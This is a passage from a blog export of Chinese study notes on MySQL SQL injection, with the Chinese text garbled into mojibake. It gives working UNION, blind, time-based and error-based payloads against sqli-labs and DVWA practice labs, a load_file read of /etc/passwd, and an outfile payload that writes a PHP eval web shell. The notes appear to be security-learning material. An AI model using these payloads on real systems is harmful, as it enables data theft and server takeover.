class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>;</span></code></pre></div></div><h2 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"># åˆ¤æ–­åˆ—è¡¨é•¿åº¦</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span></span><span class="line"></br></span><span class="line"># ç¡®å®šå›æ˜¾çš„åˆ—</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span></span><span class="line"></br></span><span class="line"># æ”¶é›†åŸºæœ¬ä¿¡æ¯</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,database(), <span class="hljs-keyword">user</span>(), version(), @<span class="hljs-variable">@basedir</span>), <span class="hljs-number">3</span></span><span class="line"></br></span><span class="line"># æ‰¾ä¸åŒçš„æ•°æ®åº“è¡¨ä¸ªæ•°</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> table_schema), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables</span><span class="line"></br></span><span class="line"># åˆ—å‡ºä¸åŒçš„æ•°æ®åº“è¡¨</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">distinct</span> table_schema), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables</span><span class="line"></br></span><span class="line"># é€šè¿‡æ•°æ®åº“åï¼ŒæŸ¥è¯¢è¡¨å</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span></span><span class="line"></br></span><span class="line"># é€šè¿‡æ•°æ®åº“åå’Œè¡¨åï¼ŒæŸ¥è¯¢åˆ—å</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;info&#x27;</span></span><span class="line"></br></span><span class="line"># é€šè¿‡æŸ¥åˆ°çš„è¡¨åå’Œåˆ—åï¼ŒæŸ¥è¯¢æ•°æ®</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flAg_T5ZNdrm), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> sqli.info</span></code></pre></div></div><h2 id="é‡è¦ä¿¡æ¯æ”¶é›†"><a href="#é‡è¦ä¿¡æ¯æ”¶é›†" class="headerlink" title="é‡è¦ä¿¡æ¯æ”¶é›†"></a>é‡è¦ä¿¡æ¯æ”¶é›†</h2><h3 id="æ•°æ®åº“ä¿¡æ¯"><a href="#æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="æ•°æ®åº“ä¿¡æ¯"></a>æ•°æ®åº“ä¿¡æ¯</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> information_schema.schema;</span></code></pre></div></div><h3 id="è¡¨ä¿¡æ¯"><a href="#è¡¨ä¿¡æ¯" class="headerlink" title="è¡¨ä¿¡æ¯"></a>è¡¨ä¿¡æ¯</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span>;</span></code></pre></div></div><h3 id="å­—æ®µä¿¡æ¯"><a href="#å­—æ®µä¿¡æ¯" class="headerlink" title="å­—æ®µä¿¡æ¯"></a>å­—æ®µä¿¡æ¯</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;users&#x27;</span>;</span></code></pre></div></div><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">?id=-<span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select 1,load_file(&#x27;</span><span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">&#x27;)</span></span></code></pre></div></div><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><h3 id="å¯»æ‰¾æ³¨å…¥ç‚¹"><a href="#å¯»æ‰¾æ³¨å…¥ç‚¹" class="headerlink" title="å¯»æ‰¾æ³¨å…¥ç‚¹"></a>å¯»æ‰¾æ³¨å…¥ç‚¹</h3><h4 id="æµ‹è¯•é£æš´"><a href="#æµ‹è¯•é£æš´" class="headerlink" title="æµ‹è¯•é£æš´"></a>æµ‹è¯•é£æš´</h4><p><code>å•å¼•å·</code> <code>åŒå¼•å·</code> <code>å¸¦æ‹¬å·</code> <code>æ—¶é—´é€»è¾‘</code></p><h4 id="39-æäº¤å¤§æ³•"><a href="#39-æäº¤å¤§æ³•" class="headerlink" title="&#39;æäº¤å¤§æ³•"></a><code>&#39;</code>æäº¤å¤§æ³•</h4><p>åˆ¤æ–­æ˜¯å¦å¯èƒ½ä¸ºæ³¨å…¥ç‚¹çš„æ–¹æ³•:<br><code>1&#39;</code> æŠ¥é”™ï¼Œè€Œ<code>1&#39;&#39;</code>æ²¡æœ‰æŠ¥é”™ã€‚<br>åˆ¤æ–­çš„ä¾æ®æ˜¯çœ‹åå°æœ‰æ²¡æœ‰è¿‡æ»¤è¿™äº›ï¼ŒæŠŠè¿™äº›å½“æˆä¸€ä¸ªæ•´ä½“æ¥è¾“å…¥ã€‚</p><h4 id="or-and-å¤§æ³•"><a href="#or-and-å¤§æ³•" class="headerlink" title="or and å¤§æ³•"></a><code>or</code> <code>and</code> å¤§æ³•</h4><h4 id="åŠ å‡å¤§æ³•"><a href="#åŠ å‡å¤§æ³•" class="headerlink" title="åŠ å‡å¤§æ³•"></a>åŠ å‡å¤§æ³•</h4><p>åˆ¤æ–­æ˜¯æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹</p><h3 id="æ•°æ®åº“æƒé™åˆ¤æ–­"><a href="#æ•°æ®åº“æƒé™åˆ¤æ–­" class="headerlink" title="æ•°æ®åº“æƒé™åˆ¤æ–­"></a>æ•°æ®åº“æƒé™åˆ¤æ–­</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> ord(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-number">114</span>;  <span class="hljs-operator">/</span><span class="hljs-operator">/</span> rootæƒé™</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> mysql.user;  <span class="hljs-operator">/</span><span class="hljs-operator">/</span> è¯»å†™æƒé™</span></code></pre></div></div><h3 id="åˆ¤æ–­å­—æ®µçš„ä¸ªæ•°"><a href="#åˆ¤æ–­å­—æ®µçš„ä¸ªæ•°" class="headerlink" title="åˆ¤æ–­å­—æ®µçš„ä¸ªæ•°"></a>åˆ¤æ–­å­—æ®µçš„ä¸ªæ•°</h3><ol><li>ä½¿ç”¨ <code>order by 1 +--+</code> å¾€ä¸ŠåŠ ã€‚ç›´åˆ°å‡ºé”™ã€‚å¯ä»¥å¿«é€Ÿåˆ¤æ–­å‡ºæ€»å…±æœ‰å¤šå°‘ä¸ªå­—æ®µã€‚</li><li>ä½¿ç”¨<code>union select 1,2,3,4</code> åˆ¤æ–­å“ªå‡ ä¸ªå­—æ®µæ˜¯ç”¨æˆ·å¯ä»¥å›æ˜¾çš„ã€‚<ul><li>æ³¨æ„ä¸€å¼€å§‹å¯ä»¥ä½¿ç”¨<code>null</code>æ¥åˆ¤æ–­å¤šå°‘ä¸ªå›æ˜¾ï¼Œå› ä¸ºæœ‰å¯èƒ½ä¸è®©ç”¨æ•°å­—å‹</li></ul></li></ol><h4 id="ç”¨UNION-SELECTè·å–å…³é”®æ•°æ®"><a href="#ç”¨UNION-SELECTè·å–å…³é”®æ•°æ®" class="headerlink" title="ç”¨UNION SELECTè·å–å…³é”®æ•°æ®"></a>ç”¨<code>UNION SELECT</code>è·å–å…³é”®æ•°æ®</h4><ul><li><code>&#39;union select user(),database() +--+</code></li><li><code>&#39;union select session_user(),current_user(),version() +--+</code></li><li><code>&#39;union select load_file(&#39;/etc/passwd&#39;),2,3,4,5,6,7,version() limit 1</code> </li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-csharp codeBlockLines"><span class="line">?id=<span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> TABLE_SCHEMA, TABLE_NAME <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;dvwa&#x27;</span></span></code></pre></div></div><h3 id="ç ´è§£å­—æ®µ"><a href="#ç ´è§£å­—æ®µ" class="headerlink" title="ç ´è§£å­—æ®µ"></a>ç ´è§£å­—æ®µ</h3><h4 id="å­—å…¸çˆ†ç ´æµ"><a href="#å­—å…¸çˆ†ç ´æµ" class="headerlink" title="å­—å…¸çˆ†ç ´æµ"></a>å­—å…¸çˆ†ç ´æµ</h4><p><code>and exists(select * from ?)     //?ä¸ºçŒœæµ‹çš„è¡¨å</code></p><h4 id="æˆªå–äºŒåˆ†æµ"><a href="#æˆªå–äºŒåˆ†æµ" class="headerlink" title="æˆªå–äºŒåˆ†æµ"></a>æˆªå–äºŒåˆ†æµ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">and</span> (length((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span>?)       <span class="hljs-operator">/</span><span class="hljs-operator">/</span>åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦ï¼Œ ç‰¹åˆ«æ³¨æ„length(()),æ˜¯ä¸¤ä¸ªæ‹¬å·</span><span class="line"><span class="hljs-keyword">and</span> (substr((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;?&#x27;</span>)</span><span class="line"><span class="hljs-keyword">and</span> (substr((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">&lt;</span><span class="hljs-string">&#x27;?&#x27;</span>)      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>åˆ©ç”¨äºŒåˆ†æ³•åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦</span></code></pre></div></div><p>åˆ¤æ–­ä¸‹ä¸€ä¸ªå­—æ®µ:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-n1ql codeBlockLines"><span class="line">id=1&#x27; and length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME != <span class="hljs-string">&#x27;guestbook&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>))&gt;<span class="hljs-number">5</span></span></code></pre></div></div><h3 id="æŸ¥æ•°æ®åº“ç‰ˆæœ¬"><a href="#æŸ¥æ•°æ®åº“ç‰ˆæœ¬" class="headerlink" title="æŸ¥æ•°æ®åº“ç‰ˆæœ¬"></a>æŸ¥æ•°æ®åº“ç‰ˆæœ¬</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">select</span> ord(mid(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">51</span>;</span></code></pre></div></div><p>ASCII 51 -&gt; 3;<br>å¤§äº3çš„ç‰ˆæœ¬, 4æˆ–è€…5 æ‰å¯ä»¥ä½¿ç”¨<code>union</code><br>è€Œæœ‰çš„å¯èƒ½ä½¿ç”¨çš„å¹¶ä¸æ˜¯mysqlï¼Œè€Œæ˜¯<code>10.1.35-MariaDB</code>ï¼Œæ‰€ä»¥æ­¤æ—¶çš„ç‰ˆæœ¬å¼€å¤´ä¸º<code>10</code></p><h3 id="æŸ¥è¯¢æ•°æ®åº“å"><a href="#æŸ¥è¯¢æ•°æ®åº“å" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“å"></a>æŸ¥è¯¢æ•°æ®åº“å</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> ;</span></code></pre></div></div><h3 id="æŸ¥è¯¢è¡¨å"><a href="#æŸ¥è¯¢è¡¨å" class="headerlink" title="æŸ¥è¯¢è¡¨å"></a>æŸ¥è¯¢è¡¨å</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span>;</span></code></pre></div></div><p><em><code>group_concat</code>å¯ä»¥æŠŠå¤šè¡Œä¸²èµ·æ¥ä¸€èµ·æ˜¾ç¤ºäº†</em></p><h3 id="æŸ¥å­—æ®µï¼ˆåˆ—ï¼‰"><a href="#æŸ¥å­—æ®µï¼ˆåˆ—ï¼‰" class="headerlink" title="æŸ¥å­—æ®µï¼ˆåˆ—ï¼‰"></a>æŸ¥å­—æ®µï¼ˆåˆ—ï¼‰</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span>;</span></code></pre></div></div><h3 id="æŸ¥æ•°æ®"><a href="#æŸ¥æ•°æ®" class="headerlink" title="æŸ¥æ•°æ®"></a>æŸ¥æ•°æ®</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> group_concat(user_id,<span class="hljs-string">&#x27;-&#x27;</span>, first_name,<span class="hljs-string">&#x27;-&#x27;</span>, last_name, <span class="hljs-string">&#x27;-&#x27;</span>,password) <span class="hljs-keyword">from</span> users;</span></code></pre></div></div><p>æˆ–è€…</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>, password <span class="hljs-keyword">from</span> users;</span></code></pre></div></div><h2 id="æ³¨å…¥æŠ€å·§"><a href="#æ³¨å…¥æŠ€å·§" class="headerlink" title="æ³¨å…¥æŠ€å·§"></a>æ³¨å…¥æŠ€å·§</h2><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>ä¸åŒçš„æ•°æ®åº“æ³¨é‡Šçš„æ–¹æ³•éƒ½ä¸ä¸€æ ·</p><ul><li><code>#</code></li><li><code>--[ç©ºæ ¼]æˆ–è€…æ˜¯--+</code></li></ul><h3 id="åŒæ³¨å…¥"><a href="#åŒæ³¨å…¥" class="headerlink" title="åŒæ³¨å…¥"></a>åŒæ³¨å…¥</h3><p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440">åŒæ³¨å…¥è¯¦è§£</a></p><p>åŒæ³¨å…¥é€šè¿‡æŠ¥é”™çš„æ–¹å¼å¾—åˆ°ç¬¬ä¸€æ¬¡selectçš„ä¿¡æ¯ã€‚</p><blockquote><p>åŸç†æ˜¯å½“<code>count()</code>åé¢è·Ÿä¸Š<code>group by</code> åˆ™ä¼šä»¥æŠ¥é”™çš„æ–¹å¼æ˜¾ç¤ºç¬¬ä¸€æ¬¡æŸ¥è¯¢çš„ä¿¡æ¯ã€‚</p></blockquote><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-number">3</span>, concat((<span class="hljs-keyword">select</span>(version())), <span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a</span></code></pre></div></div><p>æ³¨æ„ä¸€ç‚¹: éœ€è¦æŠŠ <code>concat()</code>æ”¾åˆ°æœ€åä¸€ä¸ªselectæ‰è¡Œã€‚</p><p>è¿˜æœ‰ä¸€ç§æ´¾ç”Ÿè¡¨ï¼Œæ¨¡å¼æ˜¯<code> select 1 from (table name)</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), <span class="hljs-number">2</span>, concat((<span class="hljs-keyword">select</span> version()), <span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)x <span class="hljs-comment">-- &#x27; LIMIT 0,1</span></span></code></pre></div></div><h3 id="outfile"><a href="#outfile" class="headerlink" title="outfile()"></a><code>outfile()</code></h3><p>é«˜ç‰ˆæœ¬çš„Mysqlä¼šæœ‰ä¸ª<code>secure_file_priv</code>çš„é€‰é¡¹ä¸è®©å¯¼å…¥å¯¼å‡ºæ–‡ä»¶</p><p>ä¸‹é¢ç»™ä¸€ä¸ªä¾‹å­</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">&lt;</span>?php <span class="hljs-variable">@eval</span>($_POST[&quot;giantbranch&quot;]);?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27; into outfile &#x27;</span>E:\\wamp\\www\\sqli<span class="hljs-operator">-</span>labs\\muma.php<span class="hljs-string">&#x27; %23</span></span></code></pre></div></div><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><blockquote><p>é‡ç‚¹æ˜¯é€šè¿‡Booleanåˆ¤æ–­é•¿åº¦å’Œåç§°ã€‚</p></blockquote><h4 id="å•å¼•å·ç›²æ³¨"><a href="#å•å¼•å·ç›²æ³¨" class="headerlink" title="å•å¼•å·ç›²æ³¨"></a>å•å¼•å·ç›²æ³¨</h4><p><a href="/2021/12/31/GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" title="GET å•å¼•å·ç›²æ³¨è„šæœ¬">GET å•å¼•å·ç›²æ³¨è„šæœ¬</a></p><h4 id="æ—¶é—´é€»è¾‘ç›²æ³¨"><a href="#æ—¶é—´é€»è¾‘ç›²æ³¨" class="headerlink" title="æ—¶é—´é€»è¾‘ç›²æ³¨"></a>æ—¶é—´é€»è¾‘ç›²æ³¨</h4><p>å½“æˆåŠŸå’Œå¤±è´¥çš„è¾“å‡ºæ˜¯ä¸€æ ·çš„æ—¶å€™ï¼Œä½¿ç”¨æ—¶é—´é€»è¾‘æ–¹æ³•</p><blockquote><p>é‡ç‚¹åœ¨äºå½“æŸ¥è¯¢<strong>æˆåŠŸ</strong>çš„æ—¶å€™ï¼Œå»¶è¿Ÿ5ç§’ ã€‚</p></blockquote><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(ord(substr((<span class="hljs-keyword">select</span> database()), <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">97</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">0</span>);</span></code></pre></div></div><h2 id="åŸºäºé”™è¯¯çš„æ³¨å…¥"><a href="#åŸºäºé”™è¯¯çš„æ³¨å…¥" class="headerlink" title="åŸºäºé”™è¯¯çš„æ³¨å…¥"></a>åŸºäºé”™è¯¯çš„æ³¨å…¥</h2><ul><li><a href="https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html">è¿™é‡Œ</a>æ˜¯åŸºäºé”™è¯¯æ³¨å…¥çš„æ€»ç»“</li></ul><h3 id="concat-rand-floor-å¯¼è‡´çš„é‡å¤ä¸»é”®é”™è¯¯"><a href="#concat-rand-floor-å¯¼è‡´çš„é‡å¤ä¸»é”®é”™è¯¯" class="headerlink" title="concat, rand, floor å¯¼è‡´çš„é‡å¤ä¸»é”®é”™è¯¯"></a>concat, rand, floor å¯¼è‡´çš„é‡å¤ä¸»é”®é”™è¯¯</h3><p>åŸºæœ¬å‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> concat(<span class="hljs-keyword">user</span>(), floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x, count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);</span></code></pre></div></div><p>ç”±äºrandçš„æµ®åŠ¨ï¼Œå¯¼è‡´æ¯æ¬¡whereçš„æŸ¥è¯¢ä¸ä¸€è‡´é€ æˆã€‚</p><h3 id="extractvalue-updatexml-å¯¼è‡´Xpathè·¯å¾„é”™è¯¯"><a href="#extractvalue-updatexml-å¯¼è‡´Xpathè·¯å¾„é”™è¯¯" class="headerlink" title="extractvalue(), updatexml() å¯¼è‡´Xpathè·¯å¾„é”™è¯¯"></a>extractvalue(), updatexml() å¯¼è‡´Xpathè·¯å¾„é”™è¯¯</h3><p><code>extractvalue(str, xpath)</code>åŸºæœ¬å‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>()));</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));</span></code></pre></div></div><p>æ³¨æ„çš„æ˜¯mysqlç‰ˆæœ¬åº”è¯¥å¤§äº<code>5.1.5</code><br><code>updatexml(str, xpath, str)</code>åŸºæœ¬å‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>));</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-keyword">user</span>()),<span class="hljs-number">1</span>));</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°é€šé«˜ä»·å€¼ç½‘ç«™æ•´ç†</title>
      <link href="/2021/12/28/%E6%95%B0%E9%80%9A%E9%AB%98%E4%BB%B7%E5%80%BC%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/"/>
      <url>/2021/12/28/%E6%95%B0%E9%80%9A%E9%AB%98%E4%BB%B7%E5%80%BC%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/</url>
      
